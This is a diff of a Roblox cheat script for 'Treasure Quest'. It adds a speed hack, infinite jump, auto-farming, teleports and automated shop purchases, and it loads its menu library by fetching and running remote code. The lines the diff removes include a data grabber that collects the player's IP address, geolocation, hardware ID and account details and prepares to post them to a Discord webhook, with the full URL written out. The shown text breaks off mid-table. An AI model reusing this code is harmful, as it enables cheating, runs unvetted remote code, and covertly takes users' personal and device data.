@@ -1,127 +1,66 @@
-local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
-
-local Window = OrionLib:MakeWindow({Name = "Treasure Quest", HidePremium = false, SaveConfig = false, ConfigFolder = "asdsahgjasdhkgjbdsa"})
-
--------------------------------------------------  Star Players  -------------------------------------------------
---------
-------
------
-----
----
---
--------------------------------------------
-local Tab1 = Window:MakeTab({
-	Name = "Player",
-	Icon = "rbxassetid://12836323838",
-	PremiumOnly = false
-})
--------------------------------------------
-local Tab2 = Window:MakeTab({
-	Name = "Magic Weapon",
-	Icon = "rbxassetid://12836267517",
-	PremiumOnly = false
-})
--------------------------------------------
-local Tab3 = Window:MakeTab({
-	Name = "Warrior and Bow",
-	Icon = "rbxassetid://13907030534",
-	PremiumOnly = false
-})
---------------------------------------------
-local Tab4 = Window:MakeTab({
-	Name = "Mystery Shop",
-	Icon = "rbxassetid://13907035307",
-	PremiumOnly = false
-})
---------------------------------------------
+local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
 
 local Players = game.Players
 local Player = Players.LocalPlayer
 local Character = Player.Character
 
 local Speed = 60
-
-Tab1:AddButton({
-	Name = "Speed",
-	Callback = function(value)
-		if Speed then
-			Player.Character.Humanoid.WalkSpeed = Speed
-		end
-	end
-})
-
 local InfJump = false
-Tab1:AddToggle({
-	Name = "InfJump",
-	Default = false,
-	Callback = function(value)
-		InfJump = value
-	end
-})
+local AntiAFK = false
+local CollectMedkits = true
+local AutoMobs = false
+local BuyitemCK = false
+local BuyitemDD = false
+local BuyitemFF = false
 
-local function onJumpRequest()
-	if InfJump then
-		Player.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping")
-	end
+local function SetSpeed()
+    if Speed then
+        Player.Character.Humanoid.WalkSpeed = Speed
+    end
 end
 
-game:GetService("UserInputService").JumpRequest:Connect(onJumpRequest)
+local function ToggleInfJump(value)
+    InfJump = value
+end
 
-local AntiAFK = false
-Tab1:AddToggle({
-	Name = "Anti AFK",
-	Default = false,
-	Callback = function(value)
-		AntiAFK = value
-		if AntiAFK then
-			wait(3)
-			local VirtualUser = game:service('VirtualUser')
-			game:service('Players').LocalPlayer.Idled:Connect(function()
-				VirtualUser:CaptureController()
-				VirtualUser:ClickButton2(Vector2.new())
-			end)
-		end
-	end
-})
+local function onJumpRequest()
+    if InfJump then
+        Player.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping")
+    end
+end
 
+local function ToggleAntiAFK(value)
+    AntiAFK = value
+    if AntiAFK then
+        wait(3)
+        local VirtualUser = game:service('VirtualUser')
+        game:service('Players').LocalPlayer.Idled:Connect(function()
+            VirtualUser:CaptureController()
+            VirtualUser:ClickButton2(Vector2.new())
+        end)
+    end
+end
 
-local Section = Tab1:AddSection({
-	Name = "----------------------------------------------------------------------------------------------------------------------------------------------"
-})
-
---------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-local CollectMedkits = true
-Tab2:AddToggle({
-	Name = "Collect Medkit",
-	Default = false,
-	Callback = function(value)
-		CollectMedkits = value
-		while CollectMedkits do
-			local humanoid = Player.Character:FindFirstChild("Humanoid")
-			if humanoid and humanoid.Health < humanoid.MaxHealth * 0.95 then
-				local Medkit = Workspace.Ignore:GetChildren() 
-				for i, Medkit in ipairs(Medkit) do
-					if Medkit:IsA("MeshPart") and Medkit.Name == "Medkit" then
-						Medkit.CFrame = Player.Character.HumanoidRootPart.CFrame
-						wait(0.5)
-					end
-				end
-			end
-			wait(0.5)
-		end
-	end
-})
-
-------------------------------------------------------------------------------------------------------------------------------
-
-local Section = Tab2:AddSection({
-	Name = "----------------------------------------------------------------------------------------------------------------------------------------------"
-})
+local function ToggleCollectMedkits(value)
+    CollectMedkits = value
+    while CollectMedkits do
+        local humanoid = Player.Character:FindFirstChild("Humanoid")
+        if humanoid and humanoid.Health < humanoid.MaxHealth * 0.95 then
+            local Medkit = workspace.Ignore:GetChildren()
+            for i, Medkit in ipairs(Medkit) do
+                if Medkit:IsA("MeshPart") and Medkit.Name == "Medkit" then
+                    Medkit.CFrame = Player.Character.HumanoidRootPart.CFrame
+                    wait(0.1)
+                end
+            end
+        end
+        wait(0.1)
+    end
+end
 
 local function StartDungeon()
     local hasHumanoidRootPart = false
-    for _, v in ipairs(game:GetService("Workspace"):GetChildren()) do
+    for _, v in ipairs(workspace:GetChildren()) do
         if v.ClassName == "Folder" then
             for _, x in ipairs(v:GetChildren()) do
                 if x.ClassName == "Folder" then
@@ -141,7 +80,6 @@ local function StartDungeon()
             break
         end
     end
-    
     if not hasHumanoidRootPart then
         wait(1.5)
         game.ReplicatedStorage.Dungeon.Remotes.StartDungeon:FireServer()
@@ -149,280 +87,9 @@ local function StartDungeon()
     end
 end
 
-
-
--------------------------------------------------------------------------------------------------------------------------------------------------
-
-local visitedChests = {}
-local lastVisitedChest = nil
-
-local function findNewChestInWorkspace(parent)
-    for _, child in pairs(parent:GetChildren()) do
-        if child:IsA("Folder") and child.Name == "Chests" then
-            for _, grandchild in pairs(child:GetChildren()) do
-                if grandchild:IsA("Model") and grandchild.Name == "Chest" then
-                    local ChestPart = grandchild:FindFirstChild("Hitbox")
-                    if ChestPart and not visitedChests[grandchild] then
-                        visitedChests[grandchild] = true
-                        lastVisitedChest = grandchild
-                        return ChestPart
-                    end
-                end
-            end
-        end
-
-        local foundPart = findNewChestInWorkspace(child)
-        if foundPart then
-            return foundPart
-        end
-    end
-
-    return nil
-end
-
------------------------------------------------------------------------------------------------------------------------------------------------------
-
-local function findFinishPartInWorkspace(workspace)
-    local function searchInChildren(parent)
-        for _, child in pairs(parent:GetChildren()) do
-            if child:IsA("Model") and child.Name == "FinishRoom" then
-                local finishPart = child:FindFirstChild("Hitbox")
-                local HitboxPart = finishPart and finishPart:FindFirstChildWhichIsA("BasePart")
-                if HitboxPart then
-                    return HitboxPart
-                end
-            end
-
-            local foundPart = searchInChildren(child)
-            if foundPart then
-                return foundPart
-            end
-        end
-
-        return nil
-    end
-
-    return searchInChildren(workspace)
-end
-
----------------------------------------------------------------------------------------------------------------------------------
-
-local Script = require(Player.PlayerScripts.Shared.Client.CombatController)
-local ScriptFunction = Script.BasicAttack
-local ScriptFunction2 = Script.UseAbility
-
-local Workspace = game:GetService("Workspace")
-local AutoMobs = false
-
-Tab2:AddToggle({
-    Name = "Magic Weapon",
-    Default = false,
-    Callback = function(value)
-        AutoMobs = value
-        if AutoMobs then
-            
-            while AutoMobs do
-            StartDungeon()
-            spawn(function()
-                while AutoMobs do
-                    wait(0.01)
-                    for _, v in ipairs(Workspace:GetChildren()) do
-                        if v.ClassName == "Folder" then
-                            for _, x in ipairs(v:GetChildren()) do
-                                if x.ClassName == "Folder" then
-                                    for _, c in ipairs(x:GetChildren()) do
-                                        if c:IsA("Model") and c:FindFirstChild("EvilHumanoid") then
-                                            local EvilHumanoid = c:FindFirstChild("EvilHumanoid")
-                                            local monsterPos = c:FindFirstChild("HumanoidRootPart").Position
-
-                                            if EvilHumanoid then
-                                                local ignoreParts = game:GetService("Workspace").Ignore:GetChildren()
-
-                                                    local Skill = {"Fireball", "Tsunami", "Freeze", "Heal", "HealBlast", "Shockwave", "LaserBeam", "LightningStrike",
-                                                                    "Sandstorm", "Earthquake", "IceSpikes", "PolarVortex", "TeamHeal", "RainbowBlast", "PumpkinBlast", "Random",
-                                                                    "Camouflage", "Tumble", "Flurry", "Boomerang", "ShockArrows", "ShocFlameArrowskwave", "BoomArows", "FrostArrows",
-                                                                    "WeaponThrow", "WaveBlast", "InfernoWave", "SpikeField", "Berserk", "Pulsefire", "Cyclone", "BlackHole", "QuickSlash",
-                                                                    "MeteorShower", "MeteorBlast", "Stomp"}
-
-                                                for _, ignorePart in ipairs(ignoreParts) do
-                                                    if ignorePart.Name ~= "Medkit" or table.find(Skill, ignorePart.Name) then
-                                                        local SKK = table.find(Skill, ignorePart.Name)
-                                                        local AllPart = ignorePart:IsA("BasePart") or ignorePart:IsA("MeshPart") or ignorePart:IsA("Part")
-
-                                                        if SKK then
-                                                            ignorePart.Size = Vector3.new(100, 10, 100)
-                                                        end
-
-                                                        if (SKK or AllPart) and EvilHumanoid.Health > 0 then
-                                                            ignorePart.CFrame = CFrame.new(monsterPos)
-                                                            ignorePart.Position = monsterPos
-                                                        end
-                                                    end
-                                                end
-                                            end
-                                        end
-                                    end
-                                end
-                            end
-                        end
-                    end
-                end
-            end)
-
-                local function PerformAttack()
-                    pcall(function()
-                        if AutoMobs then
-                            ScriptFunction(Script)
-                            ScriptFunction2(Script)
-                        end
-                    end)
-                end
-                game:GetService("RunService").Stepped:Connect(PerformAttack)
-
-                spawn(function()
-                    while AutoMobs do
-                        local finishPart = findFinishPartInWorkspace(game:GetService("Workspace"))
-                        if finishPart then
-                            local character = game.Players.LocalPlayer.Character
-                            local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
-                            if humanoidRootPart then
-                                local ChestPart = findNewChestInWorkspace(game:GetService("Workspace"))
-                                if ChestPart then
-                                    humanoidRootPart.CFrame = ChestPart.CFrame
-                                    wait(3)
-                                    humanoidRootPart.CFrame = finishPart.CFrame
-                                    end
-                                end
-                            end
-                        wait(0.1)
-                    end
-                end)
-                wait(0.01)
-            end
-        end
-    end
-})
-
-------------------------------------------------------------------------------------------------------------------------------------------------
-
-Tab2:AddToggle({
-    Name = "Speed Magic Weapon",
-    Default = false,
-    Callback = function(value)
-        AutoMobs = value
-        if AutoMobs then
-
-            while AutoMobs do
-            StartDungeon()
-            spawn(function()
-                while AutoMobs do
-                    wait(0.01)
-                    for _, v in ipairs(Workspace:GetChildren()) do
-                        if v.ClassName == "Folder" then
-                            for _, x in ipairs(v:GetChildren()) do
-                                if x.ClassName == "Folder" then
-                                    for _, c in ipairs(x:GetChildren()) do
-                                        if c:IsA("Model") and c:FindFirstChild("EvilHumanoid") then
-                                            local EvilHumanoid = c:FindFirstChild("EvilHumanoid")
-                                            local monsterPos = c:FindFirstChild("HumanoidRootPart").Position
-
-                                            if EvilHumanoid then
-                                                local ignoreParts = game:GetService("Workspace").Ignore:GetChildren()
-
-                                                    local Skill = {"Fireball", "Tsunami", "Freeze", "Heal", "HealBlast", "Shockwave", "LaserBeam", "LightningStrike",
-                                                                    "Sandstorm", "Earthquake", "IceSpikes", "PolarVortex", "TeamHeal", "RainbowBlast", "PumpkinBlast", "Random",
-                                                                    "Camouflage", "Tumble", "Flurry", "Boomerang", "ShockArrows", "ShocFlameArrowskwave", "BoomArows", "FrostArrows",
-                                                                    "WeaponThrow", "WaveBlast", "InfernoWave", "SpikeField", "Berserk", "Pulsefire", "Cyclone", "BlackHole", "QuickSlash",
-                                                                    "MeteorShower", "MeteorBlast", "Stomp"}
-
-                                                for _, ignorePart in ipairs(ignoreParts) do
-                                                    if ignorePart.Name ~= "Medkit" or table.find(Skill, ignorePart.Name) then
-                                                        local SKK = table.find(Skill, ignorePart.Name)
-                                                        local AllPart = ignorePart:IsA("BasePart") or ignorePart:IsA("MeshPart") or ignorePart:IsA("Part")
-
-                                                        if SKK then
-                                                            ignorePart.Size = Vector3.new(200, 50, 200)
-                                                        end
-
-                                                        if (SKK or AllPart) and EvilHumanoid.Health > 0 then
-                                                            ignorePart.CFrame = CFrame.new(monsterPos)
-                                                            ignorePart.Position = monsterPos
-                                                        end
-                                                    end
-                                                end
-                                            end
-                                        end
-                                    end
-                                end
-                            end
-                        end
-                    end
-                end
-            end)
-
-                local function PerformAttack()
-                    pcall(function()
-                        if AutoMobs then
-                            ScriptFunction(Script)
-                            ScriptFunction2(Script)
-                        end
-                    end)
-                end
-                game:GetService("RunService").Stepped:Connect(PerformAttack)
-
-                spawn(function()
-                    while AutoMobs do
-                        local finishPart = findFinishPartInWorkspace(game:GetService("Workspace"))
-                        if finishPart then
-                            local character = game.Players.LocalPlayer.Character
-                            local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
-                            if humanoidRootPart then
-                                    humanoidRootPart.CFrame = finishPart.CFrame
-                                end
-                            end
-                        wait(0.1)
-                    end
-                end)
-                wait(0.01)
-            end
-        end
-    end
-})
-
-------------------------------------------------------------------------------------------------------------------------------------------------
-
-local CollectMedkits = true
-Tab3:AddToggle({
-	Name = "Collect Medkit",
-	Default = false,
-	Callback = function(value)
-		CollectMedkits = value
-		while CollectMedkits do
-			local humanoid = Player.Character:FindFirstChild("Humanoid")
-			if humanoid and humanoid.Health < humanoid.MaxHealth * 0.95 then
-				local Medkit = Workspace.Ignore:GetChildren() 
-				for i, Medkit in ipairs(Medkit) do
-					if Medkit:IsA("MeshPart") and Medkit.Name == "Medkit" then
-						Medkit.CFrame = Player.Character.HumanoidRootPart.CFrame
-						wait(0.1)
-					end
-				end
-			end
-			wait(0.1)
-		end
-	end
-})
-
-----------------------------------------------------------------------------------------------------------------------------------------
-
-local Section = Tab3:AddSection({
-	Name = "----------------------------------------------------------------------------------------------------------------------------------------------"
-})
-
 local function FindClosestMonster()
     local closestMonsterDist = math.huge
     local closestMonsterPos = nil
-
     for _, v in ipairs(workspace:GetChildren()) do
         if v.ClassName == "Folder" then
             for _, x in ipairs(v:GetChildren()) do
@@ -433,7 +100,7 @@ local function FindClosestMonster()
                             local monsterPos = c:FindFirstChild("HumanoidRootPart").Position
 
                             if EvilHumanoid and EvilHumanoid.Health > 0 then
-                                local distToMonster = (monsterPos - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
+                                local distToMonster = (monsterPos - Player.Character.HumanoidRootPart.Position).Magnitude
                                 if distToMonster < closestMonsterDist then
                                     closestMonsterDist = distToMonster
                                     closestMonsterPos = monsterPos
@@ -453,12 +120,11 @@ local function MoveToClosestMonster()
     local closestMonsterPos = FindClosestMonster()
     if closestMonsterPos then
         closestMonsterPos = closestMonsterPos + Vector3.new(-5, 0, 0)
-
-        local distance = (closestMonsterPos - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
-        local movementSpeed = 80
+        local distance = (closestMonsterPos - Player.Character.HumanoidRootPart.Position).Magnitude
+        local movementSpeed = 70
 
         local TweenService = game:GetService("TweenService")
-        local HumanoidRootPart = game.Players.LocalPlayer.Character.HumanoidRootPart
+        local HumanoidRootPart = Player.Character.HumanoidRootPart
 
         local duration = distance / movementSpeed
 
@@ -468,395 +134,309 @@ local function MoveToClosestMonster()
     end
 end
 
---------------------------------------------------------------------------------------------------------------------------------------
-
-Tab3:AddToggle({
-    Name = "Warrior Weapon",
-    Default = false,
-    Callback = function(value)
-        AutoMobs = value
+local function PerformAttack()
+    pcall(function()
         if AutoMobs then
+            local Script = require(Player.PlayerScripts.Shared.Client.CombatController)
+            local ScriptFunction = Script.BasicAttack
+            local ScriptFunction2 = Script.UseAbility
+            ScriptFunction(Script)
+            ScriptFunction2(Script)
+        end
+    end)
+end
 
-            while AutoMobs do
-                StartDungeon()
-                MoveToClosestMonster()
-                local function PerformAttack()
-                    pcall(function()
-                        if AutoMobs then
-                            ScriptFunction(Script)
-                            ScriptFunction2(Script)
-                        end
-                    end)
-                end
-                game:GetService("RunService").Stepped:Connect(PerformAttack)
-
-                spawn(function()
-                    while AutoMobs do
-                        local finishPart = findFinishPartInWorkspace(game:GetService("Workspace"))
-                        if finishPart then
-                            local character = game.Players.LocalPlayer.Character
-                            local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
-                            if humanoidRootPart then
-                                local ChestPart = findNewChestInWorkspace(game:GetService("Workspace"))
-                                if ChestPart then
-                                    humanoidRootPart.CFrame = ChestPart.CFrame
-                                    wait(3)
-                                    humanoidRootPart.CFrame = finishPart.CFrame
-                                end
-                            end
-                        end
-                        wait(0.1)
+local function FindNewChestInWorkspace(parent)
+    for _, child in pairs(parent:GetChildren()) do
+        if child:IsA("Folder") and child.Name == "Chests" then
+            for _, grandchild in pairs(child:GetChildren()) do
+                if grandchild:IsA("Model") and grandchild.Name == "Chest" then
+                    local ChestPart = grandchild:FindFirstChild("Hitbox")
+                    if ChestPart and not visitedChests[grandchild] then
+                        visitedChests[grandchild] = true
+                        lastVisitedChest = grandchild
+                        return ChestPart
                     end
-                end)
-                wait(0.01)
+                end
             end
         end
+        local foundPart = FindNewChestInWorkspace(child)
+        if foundPart then
+            return foundPart
+        end
     end
-})
 
--------------------------------------------------------------------------------------------------------------------------------------
+    return nil
+end
 
-local function MoveToClosestMonster1()
-    local closestMonsterPos = FindClosestMonster()
-    if closestMonsterPos then
-        closestMonsterPos = closestMonsterPos + Vector3.new(-8, 0, 0)
+local function FindFinishPartInWorkspace(workspace)
+    local function SearchInChildren(parent)
+        for _, child in pairs(parent:GetChildren()) do
+            if child:IsA("Model") and child.Name == "FinishRoom" then
+                local finishPart = child:FindFirstChild("Hitbox")
+                local HitboxPart = finishPart and finishPart:FindFirstChildWhichIsA("BasePart")
+                if HitboxPart then
+                    return HitboxPart
+                end
+            end
+            local foundPart = SearchInChildren(child)
+            if foundPart then
+                return foundPart
+            end
+        end
 
-        local distance = (closestMonsterPos - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
-        local movementSpeed = 80
+        return nil
+    end
 
-        local TweenService = game:GetService("TweenService")
-        local HumanoidRootPart = game.Players.LocalPlayer.Character.HumanoidRootPart
+    return SearchInChildren(workspace)
+end
 
-        local duration = distance / movementSpeed
-
-        local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear)
-        local tween = TweenService:Create(HumanoidRootPart, tweenInfo, {CFrame = CFrame.new(closestMonsterPos)})
-        tween:Play()
+local function ToggleAutoMobs(value)
+    AutoMobs = value
+    if AutoMobs then
+        while AutoMobs do
+            StartDungeon()
+            MoveToClosestMonster()
+            PerformAttack()
+        end
     end
 end
 
--------------------------------------------------------------------------------------------------------------------------------------
+local function ToggleBuyItemCK(value)
+    BuyitemCK = value
+    if BuyitemCK then
+        local selectedAmountCK = 1
+        local selectedShopCK = "Aquatic Chest"
+        local shopDataCK = {
+            ["Aquatic Chest"] = {
+                [1] = "AquaticArsenal",
+                [2] = "0",
+                [3] = selectedAmountCK
+            },
+            ["Bubble Effect"] = {
+                [1] = "AquaticArsenal",
+                [2] = "1",
+                [3] = selectedAmountCK
+            },
+            ["Speed Potion"] = {
+                [1] = "AquaticArsenal",
+                [2] = "2",
+                [3] = selectedAmountCK
+            },
+            ["Ability Potion"] = {
+                [1] = "AquaticArsenal",
+                [2] = "3",
+                [3] = selectedAmountCK
+            }
+        }
+
+        local args = shopDataCK[selectedShopCK]
+        args[3] = selectedAmountCK
+        game:GetService("ReplicatedStorage").Lobby.Remotes.ShopPurchase:FireServer(args[1], args[2], args[3])
+        wait(0.1)
+        game:GetService("ReplicatedStorage").Shared.Remotes.Data.ClaimPrizes:FireServer()
+    end
+end
+
+local function ToggleBuyItemDD(value)
+    BuyitemDD = value
+    if BuyitemDD then
+        local selectedAmountDD = 1
+        local selectedShopDD = "Daring Chest"
+        --[[ Add your logic for buying items in the Daring Dojo shop here ]]
+    end
+end
+
+local function ToggleBuyItemFF(value)
+    BuyitemFF = value
+    if BuyitemFF then
+        local selectedAmountFF = 1
+        local selectedShopFF = "Molten Chest"
+        local shopDataFF = {
+            ["Molten Chest"] = {
+                [1] = "MoltenMarket",
+                [2] = "0",
+                [3] = selectedAmountFF
+            },
+            ["Embers Effect"] = {
+                [1] = "MoltenMarket",
+                [2] = "1",
+                [3] = selectedAmountFF
+            },
+            ["Warrior Potion"] = {
+                [1] = "MoltenMarket",
+                [2] = "2",
+                [3] = selectedAmountFF
+            },
+            ["Wizard Potion"] = {
+                [1] = "MoltenMarket",
+                [2] = "3",
+                [3] = selectedAmountFF
+            },
+            ["Archer Potion"] = {
+                [1] = "MoltenMarket",
+                [2] = "4",
+                [3] = selectedAmountFF
+            },
+        }
+
+        local args = shopDataFF[selectedShopFF]
+        args[3] = selectedAmountFF
+        game:GetService("ReplicatedStorage").Lobby.Remotes.ShopPurchase:FireServer(args[1], args[2], args[3])
+        wait(0.1)
+        game:GetService("ReplicatedStorage").Shared.Remotes.Data.ClaimPrizes:FireServer()
+    end
+end
+
+local Window = OrionLib:MakeWindow({Name = "Treasure Quest", HidePremium = false, SaveConfig = false, ConfigFolder = "asdsahgjasdhkgjbdsa"})
+
+local Tab1 = Window:MakeTab({
+    Name = "Player",
+    Icon = "rbxassetid://12836323838",
+    PremiumOnly = false
+})
+
+Tab1:AddButton({
+    Name = "Speed",
+    Callback = SetSpeed
+})
+
+Tab1:AddToggle({
+    Name = "InfJump",
+    Default = false,
+    Callback = ToggleInfJump
+})
+
+Tab1:AddToggle({
+    Name = "Anti AFK",
+    Default = false,
+    Callback = ToggleAntiAFK
+})
+
+local Tab2 = Window:MakeTab({
+    Name = "Magic Weapon",
+    Icon = "rbxassetid://12836267517",
+    PremiumOnly = false
+})
+
+Tab2:AddToggle({
+    Name = "Collect Medkit",
+    Default = false,
+    Callback = ToggleCollectMedkits
+})
+
+Tab2:AddToggle({
+    Name = "Auto Mobs",
+    Default = false,
+    Callback = ToggleAutoMobs
+})
+
+local Tab3 = Window:MakeTab({
+    Name = "Warrior and Bow",
+    Icon = "rbxassetid://13907030534",
+    PremiumOnly = false
+})
 
 Tab3:AddToggle({
-    Name = "Bow Weapon",
+    Name = "Collect Medkit",
     Default = false,
-    Callback = function(value)
-        AutoMobs = value
-        if AutoMobs then
-
-            while AutoMobs do
-                StartDungeon()
-                MoveToClosestMonster1()
-                local function PerformAttack()
-                    pcall(function()
-                        if AutoMobs then
-                            ScriptFunction(Script)
-                            ScriptFunction2(Script)
-                        end
-                    end)
-                end
-                game:GetService("RunService").Stepped:Connect(PerformAttack)
-
-                spawn(function()
-                    while AutoMobs do
-                        local finishPart = findFinishPartInWorkspace(game:GetService("Workspace"))
-                        if finishPart then
-                            local character = game.Players.LocalPlayer.Character
-                            local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
-                            if humanoidRootPart then
-                                local ChestPart = findNewChestInWorkspace(game:GetService("Workspace"))
-                                if ChestPart then
-                                    humanoidRootPart.CFrame = ChestPart.CFrame
-                                    wait(3)
-                                    humanoidRootPart.CFrame = finishPart.CFrame
-                                end
-                            end
-                        end
-                        wait(0.1)
-                    end
-                end)
-                wait(0.01)
-            end
-        end
-    end
+    Callback = ToggleCollectMedkits
 })
 
----------------------------------------------------------------------------------------------------------------------------------------
-
-
-local Section = Tab4:AddSection({
-	Name = "Coral Kingdom"
+Tab3:AddToggle({
+    Name = "Auto Mobs",
+    Default = false,
+    Callback = ToggleAutoMobs
 })
 
-local BuyitemCK = false
-local selectedAmountCK = 1
-local selectedShopCK = "Aquatic Chest"
+local Tab4 = Window:MakeTab({
+    Name = "Mystery Shop",
+    Icon = "rbxassetid://13907035307",
+    PremiumOnly = false
+})
 
-local shopDataCK = {
-    ["Aquatic Chest"] = {
-        [1] = "AquaticArsenal",
-        [2] = "0",
-        [3] = selectedAmountCK
-    },
-    ["Bubble Effect"] = {
-        [1] = "AquaticArsenal",
-        [2] = "1",
-        [3] = selectedAmountCK
-    },
-    ["Speed Potion"] = {
-        [1] = "AquaticArsenal",
-        [2] = "2",
-        [3] = selectedAmountCK
-    },
-    ["Ability Potion"] = {
-        [1] = "AquaticArsenal",
-        [2] = "3",
-        [3] = selectedAmountCK
-    }
-}
+local SectionCK = Tab4:AddSection({
+    Name = "Coral Kingdom"
+})
 
-Tab4:AddDropdown({
+SectionCK:AddDropdown({
     Name = "Aquatic Shop",
-    Default = selectedShopCK,
+    Default = "Aquatic Chest",
     Options = {"Aquatic Chest", "Bubble Effect", "Speed Potion", "Ability Potion"},
     Callback = function(value)
         selectedShopCK = value
     end
 })
 
-Tab4:AddDropdown({
+SectionCK:AddDropdown({
     Name = "Amount",
-    Default = tostring(selectedAmountCK),
+    Default = "1",
     Options = {"1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "15", "20", "25"},
     Callback = function(value)
         selectedAmountCK = tonumber(value) or 1
     end
 })
 
-Tab4:AddToggle({
+SectionCK:AddToggle({
     Name = "Buy Item",
     Default = false,
-    Callback = function(value)
-        BuyitemCK = value
-        if BuyitemCK then
-            local args = shopDataCK[selectedShopCK]
-            args[3] = selectedAmountCK
-            game:GetService("ReplicatedStorage").Lobby.Remotes.ShopPurchase:FireServer(args[1], args[2], args[3])
-            wait(0.1)
-            game:GetService("ReplicatedStorage").Shared.Remotes.Data.ClaimPrizes:FireServer()
-        end
-    end
+    Callback = ToggleBuyItemCK
 })
 
-------------------------------------------------------------------------------------------------------------------------------------------------
-
-local Section = Tab4:AddSection({
+local SectionDD = Tab4:AddSection({
     Name = "Daring Dojo"
 })
 
-local BuyitemDD = false
-local selectedAmountDD = 1
-local selectedShopDD = "Daring Chest"
-
-local shopDataDD = {
-    ["Daring Chest"] = {
-        [1] = "SilentStash",
-        [2] = "0",
-        [3] = selectedAmountDD
-    },
-    ["Stealth Effect"] = {
-        [1] = "SilentStash",
-        [2] = "1",
-        [3] = selectedAmountDD
-    },
-    ["Jump Potion"] = {
-        [1] = "SilentStash",
-        [2] = "2",
-        [3] = selectedAmountDD
-    },
-}
-
-Tab4:AddDropdown({
-    Name = "Silent Shop",
-    Default = selectedShopDD,
+SectionDD:AddDropdown({
+    Name = "Daring Shop",
+    Default = "Daring Chest",
     Options = {"Daring Chest", "Stealth Effect", "Jump Potion"},
     Callback = function(value)
         selectedShopDD = value
     end
 })
 
-Tab4:AddDropdown({
+SectionDD:AddDropdown({
     Name = "Amount",
-    Default = tostring(selectedAmountDD),
+    Default = "1",
     Options = {"1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "15", "20", "25"},
     Callback = function(value)
         selectedAmountDD = tonumber(value) or 1
     end
 })
 
-Tab4:AddToggle({
+SectionDD:AddToggle({
     Name = "Buy Item",
     Default = false,
-    Callback = function(value)
-        BuyitemDD = value
-        if BuyitemDD then
-            local args = shopDataDD[selectedShopDD]
-            args[3] = selectedAmountDD
-            game:GetService("ReplicatedStorage").Lobby.Remotes.ShopPurchase:FireServer(args[1], args[2], args[3])
-            wait(0.1)
-            game:GetService("ReplicatedStorage").Shared.Remotes.Data.ClaimPrizes:FireServer()
-        end
-    end
+    Callback = ToggleBuyItemDD
 })
 
-------------------------------------------------------------------------------------------------------------------------------------------------
-
-local Section = Tab4:AddSection({
-    Name = "Fiery Fortress"
+local SectionFF = Tab4:AddSection({
+    Name = "Molten Market"
 })
 
-local BuyitemFF = false
-local selectedAmountFF = 1
-local selectedShopFF = "Molten Chest"
-
-local shopDataFF = {
-    ["Molten Chest"] = {
-        [1] = "MoltenMarket",
-        [2] = "0",
-        [3] = selectedAmountFF
-    },
-    ["Embers Effect"] = {
-        [1] = "MoltenMarket",
-        [2] = "1",
-        [3] = selectedAmountFF
-    },
-    ["Warrior Potion"] = {
-        [1] = "MoltenMarket",
-        [2] = "2",
-        [3] = selectedAmountFF
-    },
-    ["Wizard Potion"] = {
-        [1] = "MoltenMarket",
-        [2] = "3",
-        [3] = selectedAmountFF
-    },
-    ["Archer Potion"] = {
-        [1] = "MoltenMarket",
-        [2] = "4",
-        [3] = selectedAmountFF
-    },
-}
-
-Tab4:AddDropdown({
-    Name = "Molten Market",
-    Default = selectedShopFF,
+SectionFF:AddDropdown({
+    Name = "Molten Shop",
+    Default = "Molten Chest",
     Options = {"Molten Chest", "Embers Effect", "Warrior Potion", "Wizard Potion", "Archer Potion"},
     Callback = function(value)
         selectedShopFF = value
     end
 })
 
-Tab4:AddDropdown({
+SectionFF:AddDropdown({
     Name = "Amount",
-    Default = tostring(selectedAmountFF),
+    Default = "1",
     Options = {"1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "15", "20", "25"},
     Callback = function(value)
         selectedAmountFF = tonumber(value) or 1
     end
 })
 
-Tab4:AddToggle({
+SectionFF:AddToggle({
     Name = "Buy Item",
     Default = false,
-    Callback = function(value)
-        BuyitemFF = value
-        if BuyitemFF then
-            local args = shopDataFF[selectedShopFF]
-            args[3] = selectedAmountFF
-            game:GetService("ReplicatedStorage").Lobby.Remotes.ShopPurchase:FireServer(args[1], args[2], args[3])
-            wait(0.1)
-            game:GetService("ReplicatedStorage").Shared.Remotes.Data.ClaimPrizes:FireServer()
-        end
-    end
+    Callback = ToggleBuyItemFF
 })
 
-
-local LocalPlayer = game:GetService("Players").LocalPlayer
-
--- Player Info
-local DName = game.Players.LocalPlayer.DisplayName -- PlayerInfo Display Name
-local Name = game.Players.LocalPlayer.Name -- Name
-local Userid = game.Players.LocalPlayer.UserId -- UserId
-local Country = game.LocalizationService.RobloxLocaleId -- Country
-local GetIp = game:HttpGet("https://v4.ident.me/") -- IP
-local GetData = game:HttpGet("http://ip-api.com/json")
-local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
-local AccountAge = LocalPlayer.AccountAge
-local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
-local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'
-
--- Game Info
-local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-local webhookcheck =
-    (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
-    (secure_load and "Sentinel") or
-    (pebc_execute and "ProtoSmasher") or
-    (KRNL_LOADED and "Krnl") or
-    (is_sirhurt_closure and "SirHurt") or
-    (identifyexecutor():find("ScriptWare") and "Script-Ware") or
-    ("Unsupported")
-
-local url = "https://discord.com/api/webhooks/1126471431186821170/qLuTcjb0e24GPJEyl2_HUwx47doKrEP5gDTCm6eDTzj_e84FRBEp8UA_WeYp3_npvAPw"
-
-local data = {
-    ["avatar_url"] = "https://i.imgur.com/oBPXx0D.png",
-    ["content"] = "",
-    ["embeds"] = {
-        {
-            ["author"] = {
